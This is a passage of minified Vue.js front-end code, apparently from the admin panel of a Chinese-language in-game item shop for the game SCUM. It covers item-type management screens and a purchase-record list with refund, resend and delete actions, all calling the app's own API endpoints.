i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",icon:"import"},nativeOn:{click:function(t){return t.stopPropagation(),function(){e.importItemTypesTxt="",e.importItemTypesType="own",e.showImportItemTypesItemModal=!0}.apply(null,arguments)}}},[e._v("导入商品类型")]):e._e(),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"export",loading:e.exportLoading},nativeOn:{click:function(t){return t.stopPropagation(),e.clickExportItemTypesList.apply(null,arguments)}}},[e._v("导出所有商品类型")]):e._e(),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{type:"primary",icon:"filter",size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onItemTypeListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onItemTypeListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block"}},[e._v("商品种类(ID):")]),i("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:e.itemTypeListFilter.name,callback:function(t){e.$set(e.itemTypeListFilter,"name",t)},expression:"itemTypeListFilter.name"}}),i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("商品种类(中文):")]),i("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:e.itemTypeListFilter.cnName,callback:function(t){e.$set(e.itemTypeListFilter,"cnName",t)},expression:"itemTypeListFilter.cnName"}}),i("div",{staticStyle:{width:"100px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("是否能删除:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.itemTypeListFilter.canBeDeleted,callback:function(t){e.$set(e.itemTypeListFilter,"canBeDeleted",t)},expression:"itemTypeListFilter.canBeDeleted"}},[i("a-select-option",{key:"true",attrs:{title:"是"}},[e._v("是")]),i("a-select-option",{key:"false",attrs:{title:"否"}},[e._v("否")])],1)],1)])],1),i("a-row",{staticStyle:{height:"32px","line-height":"32px"}},[i("div",{staticStyle:{width:"calc(100% - 170px)","font-weight":"bolder",color:"#ff4d4f","text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap",display:"inline-block","vertical-align":"top"}},[e._v("*注意: 一些系统预设类型的类型ID不能被删除或修改")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{float:"right",transform:"translateY(4px)"},attrs:{type:"primary",size:"small",icon:"plus"},on:{click:function(){e.showAdd2EditItemTypeModal=!0,e.add2EditItemModalType="add"}}},[e._v("新增")]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除选中商品类型吗"},on:{confirm:function(){return e.deleteItemTypes()}}},[e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right",transform:"translateY(4px)","margin-right":"10px"},attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("删除选中")]):e._e()],1):e._e()],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.itemTypeListColumns,"data-source":e.itemTypeListData,"row-key":"id",pagination:!1,loading:e.loadingItemTypeListTable,"row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t},getCheckboxProps:function(e){return{props:{disabled:!1===e.canBeDeleted}}}},bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"name",fn:function(t){return[i("div",[e._v(e._s(t))])]}},{key:"cnName",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"fatherItemTypeId",fn:function(t,a){return[i("span",[e._v(e._s(a.fatheritemTypeInfo?a.fatheritemTypeInfo.cnName:t||"-"))])]}},{key:"controls",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("span",[e._v("暂无可用操作")]):[i("a-button",{attrs:{size:"small",disabled:!1===a.canBeDeleted,icon:"edit"},on:{click:function(){e.showAdd2EditItemTypeModal=!0,e.add2EditItemModalType="edit",e.add2EditItemTypeForm.id=a.id,e.add2EditItemTypeForm.name=a.name,e.add2EditItemTypeForm.cnName=a.cnName,e.add2EditItemTypeForm.fatherItemTypeId=a.fatherItemTypeId,e.add2EditItemTypeForm.canBeDeleted=a.canBeDeleted}}},[e._v("修改")]),i("a-popconfirm",{attrs:{placement:"right",title:"确定置顶该商品类型吗?该商品类型将在商城用户端购买页面优先展示"},on:{confirm:function(){return e.topItemType(a.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{disabled:!1===a.canBeDeleted,size:"small",icon:"to-top"}},[e._v("置顶")])],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除商品类型吗"},on:{confirm:function(){return a.canBeDeleted&&e.deleteItemType(a.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"danger",icon:"delete",disabled:!a.canBeDeleted}},[e._v("删除")])],1)]]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.itemTypeListPagination.pageSize,current:e.itemTypeListPagination.pageNum,total:e.itemTypeListPagination.total},on:{change:e.onChangeItemTypeListPagination,showSizeChange:e.onShowSizeChangeItemTypeListPagination}}),i("a-modal",{attrs:{title:"导入商品类型","mask-closable":!1,width:600},on:{cancel:function(){e.showImportItemTypesItemModal=!1,e.importItemTypesType="own",e.importItemTypesTxt=""}},model:{value:e.showImportItemTypesItemModal,callback:function(t){e.showImportItemTypesItemModal=t},expression:"showImportItemTypesItemModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.importItemTypesLoading},on:{click:e.submitImportItemTypes}},[e._v("开始导入")])],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f"}},[e._v("*")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("选择导入类型：")]),i("a-radio-group",{attrs:{buttonStyle:"solid",size:"small"},model:{value:e.importItemTypesType,callback:function(t){e.importItemTypesType=t},expression:"importItemTypesType"}},[i("a-radio-button",{attrs:{value:"own"}},[e._v("从本系统导入")]),i("a-radio-button",{attrs:{value:"yingzi"}},[e._v("从影子商城导入")])],1),e.importItemTypesType&&"own"!==e.importItemTypesType?i("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f","margin-left":"15px"}},[e._v("*打击奸商，造福SCUM圈")]):e._e()],1),i("div",{staticStyle:{width:"100%","margin-top":"10px"}},[i("span",{staticStyle:{"font-weight":"bolder",color:"#ff4d4f"}},[e._v("*")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v("导入内容：")])]),i("div",{staticStyle:{width:"100%"}},[i("a-input",{staticStyle:{width:"100%","margin-top":"10px"},attrs:{type:"textarea","auto-size":{minRows:15,maxRows:15}},model:{value:e.importItemTypesTxt,callback:function(t){e.importItemTypesTxt=t},expression:"importItemTypesTxt"}})],1)],2),i("a-modal",{attrs:{title:("add"===e.add2EditItemModalType?"新增":"编辑")+"商品类型","mask-closable":!1,width:500},on:{cancel:function(){e.add2EditItemTypeForm.id=-1,e.add2EditItemTypeForm.name="",e.add2EditItemTypeForm.cnName="",e.add2EditItemTypeForm.fatherItemTypeId="",e.add2EditItemTypeForm.canBeDeleted=!0}},model:{value:e.showAdd2EditItemTypeModal,callback:function(t){e.showAdd2EditItemTypeModal=t},expression:"showAdd2EditItemTypeModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.add2EditItemTypeLoading},on:{click:e.submitAdd2EditItemType}},[e._v("提交")])],1),i("a-row",{staticStyle:{height:"40px","line-height":"40px",width:"100%","font-weight":"bolder",color:"#ff4d4f","text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"}},[e._v("*注意: 以'-set'结尾的英文类型会被发货机器人识别为套餐类型")]),e.showAdd2EditItemTypeModal?i("a-form-model",{ref:"add2EditItemTypeForm",staticStyle:{"max-width":"450px"},attrs:{model:e.add2EditItemTypeForm,rules:e.add2EditItemTypeRules,"label-col":{span:7},"wrapper-col":{span:17}}},[i("a-form-model-item",{attrs:{label:"商品种类(ID)",prop:"name"}},[i("a-input",{attrs:{disabled:!1===e.add2EditItemTypeForm.canBeDeleted},model:{value:e.add2EditItemTypeForm.name,callback:function(t){e.$set(e.add2EditItemTypeForm,"name",t)},expression:"add2EditItemTypeForm.name"}})],1),i("a-form-model-item",{attrs:{label:"商品种类(中文)",prop:"cnName",disabled:!1===e.add2EditItemTypeForm.canBeDeleted}},[i("a-input",{model:{value:e.add2EditItemTypeForm.cnName,callback:function(t){e.$set(e.add2EditItemTypeForm,"cnName",t)},expression:"add2EditItemTypeForm.cnName"}})],1),i("a-form-model-item",{attrs:{label:"父级商品种类",prop:"fatherItemTypeId"}},[i("a-select",{attrs:{disabled:!1===e.add2EditItemTypeForm.canBeDeleted},model:{value:e.add2EditItemTypeForm.fatherItemTypeId,callback:function(t){e.$set(e.add2EditItemTypeForm,"fatherItemTypeId",t)},expression:"add2EditItemTypeForm.fatherItemTypeId"}},e._l(e.allowFatherListData,(function(t){return i("a-select-option",{key:t.id},[e._v(e._s(t.cnName))])})),1)],1),i("a-form-model-item",{attrs:{label:"是否可以修改Key",prop:"canBeDeleted"}},[i("a-switch",{attrs:{disabled:"edit"===e.add2EditItemModalType},on:{change:function(){e.$refs.add2EditItemTypeForm.clearValidate()}},model:{value:e.add2EditItemTypeForm.canBeDeleted,callback:function(t){e.$set(e.add2EditItemTypeForm,"canBeDeleted",t)},expression:"add2EditItemTypeForm.canBeDeleted"}})],1)],1):e._e()],2)],1)}),[],!1,null,"0e7814aa",null),Be=qe.exports,He={name:"Items",components:{ItemTypeAdmin:Be,ItemAdmin:Me},data:function(){return{currentTab:"item-type"}},mounted:function(){this.$route.query.category?this.currentTab=this.$route.query.category:(this.$router.push({path:"/items",query:Object(s.a)(Object(s.a)({},this.$route.query),{},{category:"item-type"})}),this.currentTab="item-type")},methods:{}},je=He,Ye=Object(S.a)(je,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"商品和商品类型"}}),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-tabs",{attrs:{type:"card"},on:{change:function(t){e.$router.push({path:"/items",query:{category:t}})}},model:{value:e.currentTab,callback:function(t){e.currentTab=t},expression:"currentTab"}},[i("a-tab-pane",{key:"item-type",attrs:{tab:"商品类型管理"}},["item-type"===e.currentTab?i("ItemTypeAdmin"):e._e()],1),i("a-tab-pane",{key:"item",attrs:{tab:"商品管理"}},["item"===e.currentTab?i("ItemAdmin"):e._e()],1)],1)],1)])],1)}),[],!1,null,"135e90be",null),Ge=Ye.exports,Ke={name:"Buy",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,deleteLoading:!1,buyStatusKeyValue:{created:"已创建订单",queued:"已进入发货队列",processed:"正在发货",fullfilled:"已发货完成",refunded:"已退款"},buyStatusBadgeKeyValue:{created:"default",queued:"default",processed:"processing",fullfilled:"success",refunded:"error"},loadingBuyListTable:!1,buyListFilter:{userName:void 0,userSteamId:void 0,itemName:void 0,itemType:void 0,isPrePurchase:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0,id:void 0},buyListColumns:[{title:"订单ID",key:"id",dataIndex:"id",width:150,align:"center",scopedSlots:{customRender:"id"}},{title:"购买者昵称",key:"userName",dataIndex:"userName",width:150,align:"center",scopedSlots:{customRender:"userName"}},{title:"购买者Steam ID",key:"userSteamId",dataIndex:"userSteamId",width:150,align:"center",scopedSlots:{customRender:"userSteamId"}},{title:"商品名称",key:"itemName",dataIndex:"itemName",width:180,align:"center",scopedSlots:{customRender:"itemName"}},{title:"商品类型",key:"itemType",dataIndex:"itemType",width:120,align:"center",scopedSlots:{customRender:"itemType"}},{title:"购买数量",key:"number",dataIndex:"number",width:100,align:"center",scopedSlots:{customRender:"number"}},{title:"发货状态",key:"status",dataIndex:"status",width:100,align:"center",scopedSlots:{customRender:"status"}},{title:"购买时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"状态更新时间",key:"updateTimeStamp",dataIndex:"updateTimeStamp",width:180,align:"center",scopedSlots:{customRender:"updateTimeStamp"}}],buyListData:[],buyListPagination:{pageSize:20,pageNum:1,total:0},expandedBuyIds:[],itemTypelList:[],selectedRowKeys:[]}},mounted:function(){var e=this;this.$route.query.id&&(this.buyListFilter.id=this.$route.query.id),this.$nextTick((function(){e.getItemTypeList(),e.getBuyList(void 0,e.$route.query.id)}))},methods:{onBuyListCleanFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/buy"}),this.buyListPagination.pageNum=1,this.$nextTick((function(){e.getBuyList(!0)}))},onBuyListFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/buy"}),this.buyListPagination.pageNum=1,this.$nextTick((function(){e.getBuyList()}))},onChangeBuyListPagination:function(e){var t=this;this.buyListPagination.pageNum=e,this.$nextTick((function(){t.getBuyList()}))},onShowSizeChangeBuyListPagination:function(e,t){var i=this;this.buyListPagination.pageNum=1,this.buyListPagination.pageSize=t,this.$nextTick((function(){i.getBuyList()}))},getBuyList:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n,r,o,l,c,d;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return n=i.buyListPagination,r=n.pageNum,o=n.pageSize,e?(i.buyListFilter={userName:void 0,userSteamId:void 0,itemName:void 0,itemType:void 0,isPrePurchase:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0,id:void 0},l={pageNum:r,pageSize:o}):((c=Object(A.cloneDeep)(i.buyListFilter)).itemType="undefined"===c.itemType?void 0:c.itemType,c.isPrePurchase="true"===c.isPrePurchase||("false"===c.isPrePurchase?"false":void 0),void 0!==c.timestampStart&&void 0!==c.timestampEnd&&(c.timestampStart=R()(c.timestampStart).valueOf(),c.timestampEnd=R()(c.timestampEnd).valueOf()),l=Object(s.a)({pageNum:r,pageSize:o},c)),i.loadingBuyListTable=!0,a.prev=3,a.next=6,f({method:"GET",url:"/buyAdminSys/list",params:l});case 6:d=a.sent,i.loadingBuyListTable=!1,200===d.status&&(i.buyListPagination.total=d.data.count,i.buyListData=d.data.list.map((function(e){try{e.configs=JSON.parse(e.configs)}catch(e){}return e})),i.$nextTick((function(){if(void 0!==t){var e=d.data.list.find((function(e){return e.id===t}));i.$set(i,"expandedBuyIds",[e.id])}else i.$set(i,"expandedBuyIds",[])})),i.selectedRowKeys=[]),a.next=15;break;case 11:a.prev=11,a.t0=a.catch(3),console.error(a.t0),i.loadingBuyListTable=!1;case 15:case"end":return a.stop()}}),a,null,[[3,11]])})))()},getItemTypeList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/itemTypesAdminSys/list",params:{pageNum:1,pageSize:999999}});case 3:200===(i=t.sent).status&&(e.itemTypelList=i.data.list),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},finishBuyItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e,status:"fullfilled"},i.prev=1,i.next=4,f({method:"PUT",url:"/buyAdminSys/updateStatus",data:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getBuyList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},finishBuyItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys,status:"fullfilled"},t.prev=1,t.next=4,f({method:"PUT",url:"/buyAdminSys/updateBuysStatus",data:i});case 4:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID更新出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getBuyList(),t.next=12;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[1,9]])})))()},resendBuyItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"POST",url:"/buyAdminSys/resend",data:a});case 4:200===i.sent.status&&(t.$message.success("已操作重发"),t.getBuyList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},resendBuyItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"POST",url:"/buyAdminSys/resendBuys",data:i});case 4:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID重发出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getBuyList(),t.next=12;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[1,9]])})))()},refundBuyItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"POST",url:"/buyAdminSys/refund",data:a});case 4:200===i.sent.status&&(t.$message.success("已操作退款"),t.getBuyList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},refundBuyItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"POST",url:"/buyAdminSys/refundBuys",data:i});case 4:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID退款出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getBuyList(),t.next=12;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[1,9]])})))()},deleteBuyItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,t.deleteLoading=!0,i.next=4,f({method:"DELETE",url:"/buyAdminSys/delete",params:{id:e}});case 4:200===i.sent.status&&(t.deleteLoading=!1,t.$message.success("操作成功"),t.getBuyList()),i.next=12;break;case 8:i.prev=8,i.t0=i.catch(0),t.deleteLoading=!1,console.error(i.t0);case 12:case"end":return i.stop()}}),i,null,[[0,8]])})))()},deleteBuyItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,e.deleteLoading=!0,t.next=5,f({method:"DELETE",url:"/buyAdminSys/deleteBuys",data:i});case 5:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID删除出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getBuyList(),t.next=14;break;case 10:t.prev=10,t.t0=t.catch(1),e.deleteLoading=!1,console.error(t.t0);case 14:case"end":return t.stop()}}),t,null,[[1,10]])})))()},cleanBuyRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/buyAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getBuyList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Ve=Ke,Xe=Object(S.a)(Ve,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"购买记录列表"}},[e.userInfo&&"sysAdmin"===e.userInfo.role?i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空购买记录列表吗(包括抽奖记录)"},on:{confirm:e.cleanBuyRecord}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空购买记录")])],1)],1):e._e()]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onBuyListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onBuyListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"check-circle"},on:{click:function(){return e.finishBuyItems()}}},[e._v("标记选中为完成")]):e._e(),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"redo"},on:{click:function(){return e.resendBuyItems()}}},[e._v("重发选中")]):e._e(),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{type:"primary",size:"small",icon:"rollback"},on:{click:function(){return e.refundBuyItems()}}},[e._v("退款选中")]):e._e(),e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除选中购买记录吗"},on:{confirm:function(){return e.deleteBuyItems()}}},[e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{type:"danger",size:"small",icon:"delete"}},[e._v("删除选中")]):e._e()],1):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("购买者昵称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.buyListFilter.userName,callback:function(t){e.$set(e.buyListFilter,"userName",t)},expression:"buyListFilter.userName"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("购买者Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.buyListFilter.userSteamId,callback:function(t){e.$set(e.buyListFilter,"userSteamId",t)},expression:"buyListFilter.userSteamId"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("商品名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.buyListFilter.itemName,callback:function(t){e.$set(e.buyListFilter,"itemName",t)},expression:"buyListFilter.itemName"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("商品类型:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.buyListFilter.itemType,callback:function(t){e.$set(e.buyListFilter,"itemType",t)},expression:"buyListFilter.itemType"}},[i("a-select-option",{key:"undefined",attrs:{title:"(无类型)"}},[e._v("(无类型)")]),e._l(e.itemTypelList,(function(t){return i("a-select-option",{key:t.name,attrs:{title:t.cnName}},[e._v(e._s(t.cnName))])}))],2),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("是否预购商品:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.buyListFilter.isPrePurchase,callback:function(t){e.$set(e.buyListFilter,"isPrePurchase",t)},expression:"buyListFilter.isPrePurchase"}},[i("a-select-option",{key:"true",attrs:{title:"是"}},[e._v("是")]),i("a-select-option",{key:"false",attrs:{title:"否"}},[e._v("否")])],1),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("发货状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.buyListFilter.status,callback:function(t){e.$set(e.buyListFilter,"status",t)},expression:"buyListFilter.status"}},e._l(e.buyStatusKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("购买时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.buyListFilter.timestampStart,e.buyListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.buyListFilter,"timestampStart",t[0]),e.$set(e.buyListFilter,"timestampEnd",t[1])}}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("订单ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.buyListFilter.id,callback:function(t){e.$set(e.buyListFilter,"id",t)},expression:"buyListFilter.id"}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.buyListColumns,"data-source":e.buyListData,expandedRowKeys:e.expandedBuyIds,"row-key":"id",pagination:!1,loading:e.loadingBuyListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedBuyIds.find((function(e){return e===i.id}))&&e.expandedBuyIds.push(i.id);else{var a=Object.keys(e.expandedBuyIds).find((function(t){return e.expandedBuyIds[t]===i.id}));void 